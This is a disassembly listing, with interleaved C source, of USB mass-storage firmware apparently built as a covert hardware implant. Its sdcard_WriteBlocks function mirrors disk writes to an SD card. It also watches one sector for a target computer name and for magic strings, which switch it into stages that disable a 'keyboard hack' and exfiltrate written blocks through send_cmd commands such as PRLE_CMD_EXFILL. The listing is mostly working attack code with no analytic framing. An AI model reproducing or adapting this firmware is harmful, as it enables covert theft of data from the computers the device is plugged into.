    553a:	c8 01       	movw	r24, r16
    553c:	82 95       	swap	r24
    553e:	92 95       	swap	r25
    5540:	90 7f       	andi	r25, 0xF0	; 240
    5542:	98 27       	eor	r25, r24
    5544:	80 7f       	andi	r24, 0xF0	; 240
    5546:	98 27       	eor	r25, r24
    5548:	40 e0       	ldi	r20, 0x00	; 0
    554a:	50 e0       	ldi	r21, 0x00	; 0
    554c:	60 e0       	ldi	r22, 0x00	; 0
    554e:	70 e0       	ldi	r23, 0x00	; 0
    5550:	8f 51       	subi	r24, 0x1F	; 31
    5552:	94 4f       	sbci	r25, 0xF4	; 244
    5554:	88 df       	rcall	.-240    	; 0x5466 <sdcard_WriteBlockHandler>
        return;
    }

    while (TotalBlocks)
    {
        for (i = 0; i < 32; i++)
    5556:	0f 5f       	subi	r16, 0xFF	; 255
    5558:	1f 4f       	sbci	r17, 0xFF	; 255
    555a:	02 c0       	rjmp	.+4      	; 0x5560 <sdcard_WriteBlocks+0x86>
    555c:	00 e0       	ldi	r16, 0x00	; 0
    555e:	10 e0       	ldi	r17, 0x00	; 0
    5560:	00 32       	cpi	r16, 0x20	; 32
    5562:	11 05       	cpc	r17, r1
    5564:	54 f3       	brlt	.-44     	; 0x553a <sdcard_WriteBlocks+0x60>
        {
            sdcard_WriteBlockHandler(rwbff + (16 * i), NULL, NULL);
        }

        if (STAG_ONLYMASS == eppr_vars.curr_stage)
    5566:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    556a:	83 30       	cpi	r24, 0x03	; 3
    556c:	51 f4       	brne	.+20     	; 0x5582 <sdcard_WriteBlocks+0xa8>
        {
            disk_write(0, rwbff, BlockAddress, 1);
    556e:	01 e0       	ldi	r16, 0x01	; 1
    5570:	10 e0       	ldi	r17, 0x00	; 0
    5572:	a5 01       	movw	r20, r10
    5574:	94 01       	movw	r18, r8
    5576:	61 ee       	ldi	r22, 0xE1	; 225
    5578:	7b e0       	ldi	r23, 0x0B	; 11
    557a:	80 e0       	ldi	r24, 0x00	; 0
    557c:	0e 94 ad 06 	call	0xd5a	; 0xd5a <disk_write>
            goto retw;
    5580:	83 c1       	rjmp	.+774    	; 0x5888 <sdcard_WriteBlocks+0x3ae>
        }

        if (BlockAddress >= MAX_SECTOR_NR_POSSIBLE)
    5582:	3b e4       	ldi	r19, 0x4B	; 75
    5584:	83 16       	cp	r8, r19
    5586:	30 e5       	ldi	r19, 0x50	; 80
    5588:	93 06       	cpc	r9, r19
    558a:	a1 04       	cpc	r10, r1
    558c:	b1 04       	cpc	r11, r1
    558e:	48 f0       	brcs	.+18     	; 0x55a2 <sdcard_WriteBlocks+0xc8>
        {
            printf_P(PSTR("\r\n\r\nERROR!!! BlockAddress impossible to mirror\r\n\r\n"));
    5590:	87 e9       	ldi	r24, 0x97	; 151
    5592:	92 e0       	ldi	r25, 0x02	; 2
    5594:	9f 93       	push	r25
    5596:	8f 93       	push	r24
    5598:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
            //disk_write(0, buff_to_write, BlockAddress, 1);
            goto retw;
    559c:	0f 90       	pop	r0
    559e:	0f 90       	pop	r0
    55a0:	73 c1       	rjmp	.+742    	; 0x5888 <sdcard_WriteBlocks+0x3ae>
        }

        if (eppr_vars.curr_stage == STAG_EXFILL && BlockAddress == R_SECTOR)
    55a2:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    55a6:	82 30       	cpi	r24, 0x02	; 2
    55a8:	09 f0       	breq	.+2      	; 0x55ac <sdcard_WriteBlocks+0xd2>
    55aa:	cd c0       	rjmp	.+410    	; 0x5746 <sdcard_WriteBlocks+0x26c>
    55ac:	8c e3       	ldi	r24, 0x3C	; 60
    55ae:	88 16       	cp	r8, r24
    55b0:	91 04       	cpc	r9, r1
    55b2:	a1 04       	cpc	r10, r1
    55b4:	b1 04       	cpc	r11, r1
    55b6:	09 f0       	breq	.+2      	; 0x55ba <sdcard_WriteBlocks+0xe0>
    55b8:	c6 c0       	rjmp	.+396    	; 0x5746 <sdcard_WriteBlocks+0x26c>
        {
            unsigned char check_name[sizeof(EXFIL_STR)];
            check_name[sizeof(check_name) - 1] = '\0';
    55ba:	60 96       	adiw	r28, 0x10	; 16
    55bc:	1f ae       	std	Y+63, r1	; 0x3f
    55be:	60 97       	sbiw	r28, 0x10	; 16
            memcpy(check_name, rwbff, sizeof(check_name) - 1);
    55c0:	86 e0       	ldi	r24, 0x06	; 6
    55c2:	e1 ee       	ldi	r30, 0xE1	; 225
    55c4:	fb e0       	ldi	r31, 0x0B	; 11
    55c6:	de 01       	movw	r26, r28
    55c8:	a7 5b       	subi	r26, 0xB7	; 183
    55ca:	bf 4f       	sbci	r27, 0xFF	; 255
    55cc:	01 90       	ld	r0, Z+
    55ce:	0d 92       	st	X+, r0
    55d0:	8a 95       	dec	r24
    55d2:	e1 f7       	brne	.-8      	; 0x55cc <sdcard_WriteBlocks+0xf2>

            if (mystricmp((char*)check_name, (char*)MASTR_STR) == 0)
    55d4:	6c e1       	ldi	r22, 0x1C	; 28
    55d6:	77 e0       	ldi	r23, 0x07	; 7
    55d8:	ce 01       	movw	r24, r28
    55da:	87 5b       	subi	r24, 0xB7	; 183
    55dc:	9f 4f       	sbci	r25, 0xFF	; 255
    55de:	0e 94 2a 05 	call	0xa54	; 0xa54 <mystricmp>
    55e2:	89 2b       	or	r24, r25
    55e4:	09 f5       	brne	.+66     	; 0x5628 <sdcard_WriteBlocks+0x14e>
            {
                printf("\r\n\r\nATTENTION: I AM IN ONLY MASS STORAGE STAGE!!\r\n\r\n");
    55e6:	83 e2       	ldi	r24, 0x23	; 35
    55e8:	97 e0       	ldi	r25, 0x07	; 7
    55ea:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    55ee:	1f b7       	in	r17, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    55f0:	f8 94       	cli
    55f2:	81 e0       	ldi	r24, 0x01	; 1
    55f4:	06 c0       	rjmp	.+12     	; 0x5602 <sdcard_WriteBlocks+0x128>
                {
                    eppr_vars.curr_stage = STAG_ONLYMASS;
    55f6:	83 e0       	ldi	r24, 0x03	; 3
    55f8:	80 93 83 09 	sts	0x0983, r24	; 0x800983 <eppr_vars+0x1>
                    save_eepr();
    55fc:	0e 94 6d 03 	call	0x6da	; 0x6da <save_eepr>
            memcpy(check_name, rwbff, sizeof(check_name) - 1);

            if (mystricmp((char*)check_name, (char*)MASTR_STR) == 0)
            {
                printf("\r\n\r\nATTENTION: I AM IN ONLY MASS STORAGE STAGE!!\r\n\r\n");
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    5600:	80 e0       	ldi	r24, 0x00	; 0
    5602:	81 11       	cpse	r24, r1
    5604:	f8 cf       	rjmp	.-16     	; 0x55f6 <sdcard_WriteBlocks+0x11c>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    5606:	1f bf       	out	0x3f, r17	; 63
                {
                    eppr_vars.curr_stage = STAG_ONLYMASS;
                    save_eepr();
                }
                CMD_t cmd = { .cmd = PRLE_CMD_REBOOTME };
    5608:	ce 01       	movw	r24, r28
    560a:	01 96       	adiw	r24, 0x01	; 1
    560c:	28 e4       	ldi	r18, 0x48	; 72
    560e:	dc 01       	movw	r26, r24
    5610:	1d 92       	st	X+, r1
    5612:	2a 95       	dec	r18
    5614:	e9 f7       	brne	.-6      	; 0x5610 <sdcard_WriteBlocks+0x136>
    5616:	25 e1       	ldi	r18, 0x15	; 21
    5618:	35 e0       	ldi	r19, 0x05	; 5
    561a:	3a 83       	std	Y+2, r19	; 0x02
    561c:	29 83       	std	Y+1, r18	; 0x01
                send_cmd(&cmd, NULL);
    561e:	60 e0       	ldi	r22, 0x00	; 0
    5620:	70 e0       	ldi	r23, 0x00	; 0
    5622:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
    5626:	1d c1       	rjmp	.+570    	; 0x5862 <sdcard_WriteBlocks+0x388>
            }
            else if (mystricmp((char*)check_name, (char*)EXFBLK_STR) == 0)
    5628:	67 e5       	ldi	r22, 0x57	; 87
    562a:	77 e0       	ldi	r23, 0x07	; 7
    562c:	ce 01       	movw	r24, r28
    562e:	87 5b       	subi	r24, 0xB7	; 183
    5630:	9f 4f       	sbci	r25, 0xFF	; 255
    5632:	0e 94 2a 05 	call	0xa54	; 0xa54 <mystricmp>
    5636:	89 2b       	or	r24, r25
    5638:	39 f5       	brne	.+78     	; 0x5688 <sdcard_WriteBlocks+0x1ae>
            {
                printf("\r\nExfiltrating block...\r\n");
    563a:	8e e5       	ldi	r24, 0x5E	; 94
    563c:	97 e0       	ldi	r25, 0x07	; 7
    563e:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>

                CMD_t cmd = { .cmd = PRLE_CMD_EXFILL };
    5642:	fe 01       	movw	r30, r28
    5644:	31 96       	adiw	r30, 0x01	; 1
    5646:	88 e4       	ldi	r24, 0x48	; 72
    5648:	df 01       	movw	r26, r30
    564a:	1d 92       	st	X+, r1
    564c:	8a 95       	dec	r24
    564e:	e9 f7       	brne	.-6      	; 0x564a <sdcard_WriteBlocks+0x170>
    5650:	8e e8       	ldi	r24, 0x8E	; 142
    5652:	93 e0       	ldi	r25, 0x03	; 3
    5654:	9a 83       	std	Y+2, r25	; 0x02
    5656:	89 83       	std	Y+1, r24	; 0x01
                memcpy(cmd.opt_data, rwbff, sizeof(EXFL_BLK_t));
    5658:	8e e2       	ldi	r24, 0x2E	; 46
    565a:	e1 ee       	ldi	r30, 0xE1	; 225
    565c:	fb e0       	ldi	r31, 0x0B	; 11
    565e:	de 01       	movw	r26, r28
    5660:	13 96       	adiw	r26, 0x03	; 3
    5662:	01 90       	ld	r0, Z+
    5664:	0d 92       	st	X+, r0
    5666:	8a 95       	dec	r24
    5668:	e1 f7       	brne	.-8      	; 0x5662 <sdcard_WriteBlocks+0x188>
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    566a:	1f b7       	in	r17, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    566c:	f8 94       	cli
    566e:	81 e0       	ldi	r24, 0x01	; 1
    5670:	07 c0       	rjmp	.+14     	; 0x5680 <sdcard_WriteBlocks+0x1a6>
                {
                    send_cmd(&cmd, NULL);
    5672:	60 e0       	ldi	r22, 0x00	; 0
    5674:	70 e0       	ldi	r23, 0x00	; 0
    5676:	ce 01       	movw	r24, r28
    5678:	01 96       	adiw	r24, 0x01	; 1
    567a:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
            {
                printf("\r\nExfiltrating block...\r\n");

                CMD_t cmd = { .cmd = PRLE_CMD_EXFILL };
                memcpy(cmd.opt_data, rwbff, sizeof(EXFL_BLK_t));
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    567e:	80 e0       	ldi	r24, 0x00	; 0
    5680:	81 11       	cpse	r24, r1
    5682:	f7 cf       	rjmp	.-18     	; 0x5672 <sdcard_WriteBlocks+0x198>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    5684:	1f bf       	out	0x3f, r17	; 63
    __asm__ volatile ("" ::: "memory");
    5686:	ed c0       	rjmp	.+474    	; 0x5862 <sdcard_WriteBlocks+0x388>
                {
                    send_cmd(&cmd, NULL);
                }
            }
            else if (mystricmp((char*)check_name, (char*)RSTPKT_STR) == 0)
    5688:	67 e7       	ldi	r22, 0x77	; 119
    568a:	77 e0       	ldi	r23, 0x07	; 7
    568c:	ce 01       	movw	r24, r28
    568e:	87 5b       	subi	r24, 0xB7	; 183
    5690:	9f 4f       	sbci	r25, 0xFF	; 255
    5692:	0e 94 2a 05 	call	0xa54	; 0xa54 <mystricmp>
    5696:	89 2b       	or	r24, r25
    5698:	09 f0       	breq	.+2      	; 0x569c <sdcard_WriteBlocks+0x1c2>
    569a:	e3 c0       	rjmp	.+454    	; 0x5862 <sdcard_WriteBlocks+0x388>
            {
                printf("\r\nGetting and reseting nr of packets... %"  PRIu32 "\r\n",
    569c:	80 91 7d 09 	lds	r24, 0x097D	; 0x80097d <nr_packet_send>
    56a0:	90 91 7e 09 	lds	r25, 0x097E	; 0x80097e <nr_packet_send+0x1>
    56a4:	a0 91 7f 09 	lds	r26, 0x097F	; 0x80097f <nr_packet_send+0x2>
    56a8:	b0 91 80 09 	lds	r27, 0x0980	; 0x800980 <nr_packet_send+0x3>
    56ac:	bf 93       	push	r27
    56ae:	af 93       	push	r26
    56b0:	9f 93       	push	r25
    56b2:	8f 93       	push	r24
    56b4:	8e e7       	ldi	r24, 0x7E	; 126
    56b6:	97 e0       	ldi	r25, 0x07	; 7
    56b8:	9f 93       	push	r25
    56ba:	8f 93       	push	r24
    56bc:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
                       nr_packet_send);
                last_cmd_nr = true;
    56c0:	81 e0       	ldi	r24, 0x01	; 1
    56c2:	80 93 7c 09 	sts	0x097C, r24	; 0x80097c <last_cmd_nr>
                CMD_t cmd = { .cmd = PRLE_CMD_GETRSTPKT };
    56c6:	fe 01       	movw	r30, r28
    56c8:	31 96       	adiw	r30, 0x01	; 1
    56ca:	88 e4       	ldi	r24, 0x48	; 72
    56cc:	df 01       	movw	r26, r30
    56ce:	1d 92       	st	X+, r1
    56d0:	8a 95       	dec	r24
    56d2:	e9 f7       	brne	.-6      	; 0x56ce <sdcard_WriteBlocks+0x1f4>
    56d4:	83 e9       	ldi	r24, 0x93	; 147
    56d6:	93 e0       	ldi	r25, 0x03	; 3
    56d8:	9a 83       	std	Y+2, r25	; 0x02
    56da:	89 83       	std	Y+1, r24	; 0x01
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    56dc:	1f b7       	in	r17, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    56de:	f8 94       	cli
    56e0:	0f 90       	pop	r0
    56e2:	0f 90       	pop	r0
    56e4:	0f 90       	pop	r0
    56e6:	0f 90       	pop	r0
    56e8:	0f 90       	pop	r0
    56ea:	0f 90       	pop	r0
    56ec:	81 e0       	ldi	r24, 0x01	; 1
    56ee:	0f c0       	rjmp	.+30     	; 0x570e <sdcard_WriteBlocks+0x234>
                {
                    nr_packet_send = 0;
    56f0:	10 92 7d 09 	sts	0x097D, r1	; 0x80097d <nr_packet_send>
    56f4:	10 92 7e 09 	sts	0x097E, r1	; 0x80097e <nr_packet_send+0x1>
    56f8:	10 92 7f 09 	sts	0x097F, r1	; 0x80097f <nr_packet_send+0x2>
    56fc:	10 92 80 09 	sts	0x0980, r1	; 0x800980 <nr_packet_send+0x3>
                    send_cmd(&cmd, (void*)&nr_packet_send);
    5700:	6d e7       	ldi	r22, 0x7D	; 125
    5702:	79 e0       	ldi	r23, 0x09	; 9
    5704:	ce 01       	movw	r24, r28
    5706:	01 96       	adiw	r24, 0x01	; 1
    5708:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
            {
                printf("\r\nGetting and reseting nr of packets... %"  PRIu32 "\r\n",
                       nr_packet_send);
                last_cmd_nr = true;
                CMD_t cmd = { .cmd = PRLE_CMD_GETRSTPKT };
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    570c:	80 e0       	ldi	r24, 0x00	; 0
    570e:	81 11       	cpse	r24, r1
    5710:	ef cf       	rjmp	.-34     	; 0x56f0 <sdcard_WriteBlocks+0x216>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    5712:	1f bf       	out	0x3f, r17	; 63
                {
                    nr_packet_send = 0;
                    send_cmd(&cmd, (void*)&nr_packet_send);
                }

                printf("\r\nnr of packets: %" PRIu32 "\r\n", nr_packet_send);
    5714:	80 91 7d 09 	lds	r24, 0x097D	; 0x80097d <nr_packet_send>
    5718:	90 91 7e 09 	lds	r25, 0x097E	; 0x80097e <nr_packet_send+0x1>
    571c:	a0 91 7f 09 	lds	r26, 0x097F	; 0x80097f <nr_packet_send+0x2>
    5720:	b0 91 80 09 	lds	r27, 0x0980	; 0x800980 <nr_packet_send+0x3>
    5724:	bf 93       	push	r27
    5726:	af 93       	push	r26
    5728:	9f 93       	push	r25
    572a:	8f 93       	push	r24
    572c:	8c ea       	ldi	r24, 0xAC	; 172
    572e:	97 e0       	ldi	r25, 0x07	; 7
    5730:	9f 93       	push	r25
    5732:	8f 93       	push	r24
    5734:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
    5738:	0f 90       	pop	r0
    573a:	0f 90       	pop	r0
    573c:	0f 90       	pop	r0
    573e:	0f 90       	pop	r0
    5740:	0f 90       	pop	r0
    5742:	0f 90       	pop	r0
    5744:	8e c0       	rjmp	.+284    	; 0x5862 <sdcard_WriteBlocks+0x388>
            }

            goto justwrite;
        }

        if (eppr_vars.curr_stage == STAG_1 && BlockAddress == R_SECTOR)
    5746:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    574a:	81 11       	cpse	r24, r1
    574c:	4a c0       	rjmp	.+148    	; 0x57e2 <sdcard_WriteBlocks+0x308>
    574e:	bc e3       	ldi	r27, 0x3C	; 60
    5750:	8b 16       	cp	r8, r27
    5752:	91 04       	cpc	r9, r1
    5754:	a1 04       	cpc	r10, r1
    5756:	b1 04       	cpc	r11, r1
    5758:	09 f0       	breq	.+2      	; 0x575c <sdcard_WriteBlocks+0x282>
    575a:	43 c0       	rjmp	.+134    	; 0x57e2 <sdcard_WriteBlocks+0x308>
        {
            unsigned char check_name[sizeof(TARGET_COMPUTER_NAME)];
            check_name[sizeof(check_name) - 1] = '\0';
    575c:	64 96       	adiw	r28, 0x14	; 20
    575e:	1f ae       	std	Y+63, r1	; 0x3f
    5760:	64 97       	sbiw	r28, 0x14	; 20
            memcpy(check_name, rwbff, sizeof(check_name) - 1);
    5762:	8a e0       	ldi	r24, 0x0A	; 10
    5764:	e1 ee       	ldi	r30, 0xE1	; 225
    5766:	fb e0       	ldi	r31, 0x0B	; 11
    5768:	de 01       	movw	r26, r28
    576a:	a7 5b       	subi	r26, 0xB7	; 183
    576c:	bf 4f       	sbci	r27, 0xFF	; 255
    576e:	01 90       	ld	r0, Z+
    5770:	0d 92       	st	X+, r0
    5772:	8a 95       	dec	r24
    5774:	e1 f7       	brne	.-8      	; 0x576e <sdcard_WriteBlocks+0x294>

            if (mystricmp((char*)check_name, (char*)TARGET_COMPUTER_NAME) == 0)
    5776:	63 ec       	ldi	r22, 0xC3	; 195
    5778:	77 e0       	ldi	r23, 0x07	; 7
    577a:	ce 01       	movw	r24, r28
    577c:	87 5b       	subi	r24, 0xB7	; 183
    577e:	9f 4f       	sbci	r25, 0xFF	; 255
    5780:	0e 94 2a 05 	call	0xa54	; 0xa54 <mystricmp>
    5784:	89 2b       	or	r24, r25
    5786:	09 f0       	breq	.+2      	; 0x578a <sdcard_WriteBlocks+0x2b0>
    5788:	6c c0       	rjmp	.+216    	; 0x5862 <sdcard_WriteBlocks+0x388>
            {
                printf("\r\n\r\nATTENTION: I AM CONNECTING  TO THE TARGET COMPUTER!!: %s\r\n\r\n",
    578a:	83 ec       	ldi	r24, 0xC3	; 195
    578c:	97 e0       	ldi	r25, 0x07	; 7
    578e:	9f 93       	push	r25
    5790:	8f 93       	push	r24
    5792:	8e ec       	ldi	r24, 0xCE	; 206
    5794:	97 e0       	ldi	r25, 0x07	; 7
    5796:	9f 93       	push	r25
    5798:	8f 93       	push	r24
    579a:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
                       TARGET_COMPUTER_NAME);
                disable_keyboard_hack = true;
    579e:	81 e0       	ldi	r24, 0x01	; 1
    57a0:	80 93 5c 09 	sts	0x095C, r24	; 0x80095c <disable_keyboard_hack>
                CMD_t cmd = { .cmd = PRLE_CMD_I_AM_IN_STAGE2 };
    57a4:	8e 01       	movw	r16, r28
    57a6:	0f 5f       	subi	r16, 0xFF	; 255
    57a8:	1f 4f       	sbci	r17, 0xFF	; 255
    57aa:	88 e4       	ldi	r24, 0x48	; 72
    57ac:	f8 01       	movw	r30, r16
    57ae:	11 92       	st	Z+, r1
    57b0:	8a 95       	dec	r24
    57b2:	e9 f7       	brne	.-6      	; 0x57ae <sdcard_WriteBlocks+0x2d4>
    57b4:	8f e0       	ldi	r24, 0x0F	; 15
    57b6:	98 e0       	ldi	r25, 0x08	; 8
    57b8:	9a 83       	std	Y+2, r25	; 0x02
    57ba:	89 83       	std	Y+1, r24	; 0x01
                send_cmd(&cmd, NULL);
    57bc:	60 e0       	ldi	r22, 0x00	; 0
    57be:	70 e0       	ldi	r23, 0x00	; 0
    57c0:	c8 01       	movw	r24, r16
    57c2:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
                cmd.cmd = PRLE_CMD_REBOOTME;
    57c6:	85 e1       	ldi	r24, 0x15	; 21
    57c8:	95 e0       	ldi	r25, 0x05	; 5
    57ca:	9a 83       	std	Y+2, r25	; 0x02
    57cc:	89 83       	std	Y+1, r24	; 0x01
                send_cmd(&cmd, NULL);
    57ce:	60 e0       	ldi	r22, 0x00	; 0
    57d0:	70 e0       	ldi	r23, 0x00	; 0
    57d2:	c8 01       	movw	r24, r16
    57d4:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
    57d8:	0f 90       	pop	r0
    57da:	0f 90       	pop	r0
    57dc:	0f 90       	pop	r0
    57de:	0f 90       	pop	r0
    57e0:	40 c0       	rjmp	.+128    	; 0x5862 <sdcard_WriteBlocks+0x388>
            }
            goto justwrite;
        }

        if (eppr_vars.curr_stage == STAG_2 && BlockAddress == R_SECTOR)
    57e2:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    57e6:	81 30       	cpi	r24, 0x01	; 1
    57e8:	e1 f5       	brne	.+120    	; 0x5862 <sdcard_WriteBlocks+0x388>
    57ea:	fc e3       	ldi	r31, 0x3C	; 60
    57ec:	8f 16       	cp	r8, r31
    57ee:	91 04       	cpc	r9, r1
    57f0:	a1 04       	cpc	r10, r1
    57f2:	b1 04       	cpc	r11, r1
    57f4:	b1 f5       	brne	.+108    	; 0x5862 <sdcard_WriteBlocks+0x388>
        {
            unsigned char exfill_name[sizeof(EXFIL_STR)];
            exfill_name[sizeof(EXFIL_STR) - 1] = '\0';
    57f6:	60 96       	adiw	r28, 0x10	; 16
    57f8:	1f ae       	std	Y+63, r1	; 0x3f
    57fa:	60 97       	sbiw	r28, 0x10	; 16
            memcpy(exfill_name, rwbff, sizeof(exfill_name) - 1);
    57fc:	86 e0       	ldi	r24, 0x06	; 6
    57fe:	e1 ee       	ldi	r30, 0xE1	; 225
    5800:	fb e0       	ldi	r31, 0x0B	; 11
    5802:	de 01       	movw	r26, r28
    5804:	a7 5b       	subi	r26, 0xB7	; 183
    5806:	bf 4f       	sbci	r27, 0xFF	; 255
    5808:	01 90       	ld	r0, Z+
    580a:	0d 92       	st	X+, r0
    580c:	8a 95       	dec	r24
    580e:	e1 f7       	brne	.-8      	; 0x5808 <sdcard_WriteBlocks+0x32e>

            if (mystricmp((char*)exfill_name, (char*)EXFIL_STR) == 0)
    5810:	64 e1       	ldi	r22, 0x14	; 20
    5812:	78 e0       	ldi	r23, 0x08	; 8
    5814:	ce 01       	movw	r24, r28
    5816:	87 5b       	subi	r24, 0xB7	; 183
    5818:	9f 4f       	sbci	r25, 0xFF	; 255
    581a:	0e 94 2a 05 	call	0xa54	; 0xa54 <mystricmp>
    581e:	89 2b       	or	r24, r25
    5820:	01 f5       	brne	.+64     	; 0x5862 <sdcard_WriteBlocks+0x388>
            {
                printf("\r\n\r\nATTENTION: I AM IN EXFILL STAGE!!\r\n\r\n");
    5822:	8b e1       	ldi	r24, 0x1B	; 27
    5824:	98 e0       	ldi	r25, 0x08	; 8
    5826:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    582a:	1f b7       	in	r17, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    582c:	f8 94       	cli
    582e:	81 e0       	ldi	r24, 0x01	; 1
    5830:	06 c0       	rjmp	.+12     	; 0x583e <sdcard_WriteBlocks+0x364>
                {
                    eppr_vars.curr_stage = STAG_EXFILL;
    5832:	82 e0       	ldi	r24, 0x02	; 2
    5834:	80 93 83 09 	sts	0x0983, r24	; 0x800983 <eppr_vars+0x1>
                    save_eepr();
    5838:	0e 94 6d 03 	call	0x6da	; 0x6da <save_eepr>
            memcpy(exfill_name, rwbff, sizeof(exfill_name) - 1);

            if (mystricmp((char*)exfill_name, (char*)EXFIL_STR) == 0)
            {
                printf("\r\n\r\nATTENTION: I AM IN EXFILL STAGE!!\r\n\r\n");
                ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    583c:	80 e0       	ldi	r24, 0x00	; 0
    583e:	81 11       	cpse	r24, r1
    5840:	f8 cf       	rjmp	.-16     	; 0x5832 <sdcard_WriteBlocks+0x358>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    5842:	1f bf       	out	0x3f, r17	; 63
                {
                    eppr_vars.curr_stage = STAG_EXFILL;
                    save_eepr();
                }
                CMD_t cmd = { .cmd = PRLE_CMD_REBOOTME };
    5844:	ce 01       	movw	r24, r28
    5846:	01 96       	adiw	r24, 0x01	; 1
    5848:	28 e4       	ldi	r18, 0x48	; 72
    584a:	dc 01       	movw	r26, r24
    584c:	1d 92       	st	X+, r1
    584e:	2a 95       	dec	r18
    5850:	e9 f7       	brne	.-6      	; 0x584c <sdcard_WriteBlocks+0x372>
    5852:	25 e1       	ldi	r18, 0x15	; 21
    5854:	35 e0       	ldi	r19, 0x05	; 5
    5856:	3a 83       	std	Y+2, r19	; 0x02
    5858:	29 83       	std	Y+1, r18	; 0x01
                send_cmd(&cmd, NULL);
    585a:	60 e0       	ldi	r22, 0x00	; 0
    585c:	70 e0       	ldi	r23, 0x00	; 0
    585e:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
            }
            goto justwrite;
        }

justwrite:
        disk_write(0, rwbff, BlockAddress + MIRROR_START_SECTOR, 1);
    5862:	01 e0       	ldi	r16, 0x01	; 1
    5864:	10 e0       	ldi	r17, 0x00	; 0
    5866:	a5 01       	movw	r20, r10
    5868:	94 01       	movw	r18, r8
    586a:	28 5f       	subi	r18, 0xF8	; 248
    586c:	3d 4a       	sbci	r19, 0xAD	; 173
    586e:	4f 4f       	sbci	r20, 0xFF	; 255
    5870:	5f 4f       	sbci	r21, 0xFF	; 255
    5872:	61 ee       	ldi	r22, 0xE1	; 225
    5874:	7b e0       	ldi	r23, 0x0B	; 11
    5876:	80 e0       	ldi	r24, 0x00	; 0
    5878:	0e 94 ad 06 	call	0xd5a	; 0xd5a <disk_write>
        set_bit_mpbl(BlockAddress);
    587c:	f4 01       	movw	r30, r8
    587e:	e7 59       	subi	r30, 0x97	; 151
    5880:	fd 4d       	sbci	r31, 0xDD	; 221
    5882:	80 81       	ld	r24, Z
    5884:	81 60       	ori	r24, 0x01	; 1
    5886:	80 83       	st	Z, r24

retw:

        /* Check if the current command is being aborted by the host */
        if (MSInterfaceInfo->State.IsMassStoreReset)
    5888:	f6 01       	movw	r30, r12
    588a:	80 ad       	ldd	r24, Z+56	; 0x38
    588c:	81 11       	cpse	r24, r1
    588e:	15 c0       	rjmp	.+42     	; 0x58ba <sdcard_WriteBlocks+0x3e0>
        {
            return;
        }

        /* Decrement the blocks remaining counter and reset the sub block counter */
        BlockAddress++;
    5890:	ff ef       	ldi	r31, 0xFF	; 255
    5892:	8f 1a       	sub	r8, r31
    5894:	9f 0a       	sbc	r9, r31
    5896:	af 0a       	sbc	r10, r31
    5898:	bf 0a       	sbc	r11, r31
        TotalBlocks--;
    589a:	21 e0       	ldi	r18, 0x01	; 1
    589c:	e2 1a       	sub	r14, r18
    589e:	f1 08       	sbc	r15, r1
    if (Endpoint_WaitUntilReady())
    {
        return;
    }

    while (TotalBlocks)
    58a0:	e1 14       	cp	r14, r1
    58a2:	f1 04       	cpc	r15, r1
    58a4:	09 f0       	breq	.+2      	; 0x58a8 <sdcard_WriteBlocks+0x3ce>
    58a6:	5a ce       	rjmp	.-844    	; 0x555c <sdcard_WriteBlocks+0x82>
			 *          on its direction.
			 */
			static inline bool Endpoint_IsReadWriteAllowed(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsReadWriteAllowed(void)
			{
				return ((UEINTX & (1 << RWAL)) ? true : false);
    58a8:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
        BlockAddress++;
        TotalBlocks--;
    }

    /* If the endpoint is empty, clear it ready for the next packet from the host */
    if (!(Endpoint_IsReadWriteAllowed()))
    58ac:	85 fd       	sbrc	r24, 5
    58ae:	05 c0       	rjmp	.+10     	; 0x58ba <sdcard_WriteBlocks+0x3e0>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    58b0:	e8 ee       	ldi	r30, 0xE8	; 232
    58b2:	f0 e0       	ldi	r31, 0x00	; 0
    58b4:	80 81       	ld	r24, Z
    58b6:	8b 77       	andi	r24, 0x7B	; 123
    58b8:	80 83       	st	Z, r24
    {
        Endpoint_ClearOUT();
    }
}
